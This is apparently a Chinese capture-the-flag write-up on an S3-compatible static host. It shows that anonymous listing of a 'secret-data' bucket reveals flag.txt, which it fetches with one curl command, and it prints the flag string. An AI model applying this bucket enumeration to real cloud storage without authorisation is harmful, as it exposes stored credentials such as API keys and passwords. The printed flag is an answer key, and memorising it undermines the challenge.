## 题目原文

> 某企业将部分业务数据迁移到了云上，并对外提供了一个基于对象存储（S3 兼容）的静态资产服务，以 path-style 匿名对外提供对象访问。已获授权对其云环境进行安全评估，请设法获取其中受保护的敏感凭据（flag）。

## 题解

### 入口与指纹

服务标题是 `CloudAssets · S3 Static Host`。页面说明访问形式是 path-style：`/<bucket>/<key>`。公开例子是 `/company-assets/`。

### 关键观察

`/company-assets/` 只能看到 logo 和说明。同一种匿名列目录对 `secret-data` 也成立。`GET /secret-data/` 返回 S3 的 `ListBucketResult`，里面有 4 个对象，其中包括 `flag.txt`。

### 利用链

直接请求这个对象：

```bash
T=$(head -1 .target)
curl -sS "http://$T/secret-data/flag.txt"
```

本次返回 `flag{0dd3e00b-cbcd-4eb4-966b-2128261b017d}`。平台接受。

### flag 位置

`secret-data` 桶的 `flag.txt`。同桶里的 API key、数据库口令和备份配置都不是这道题要交的 flag。
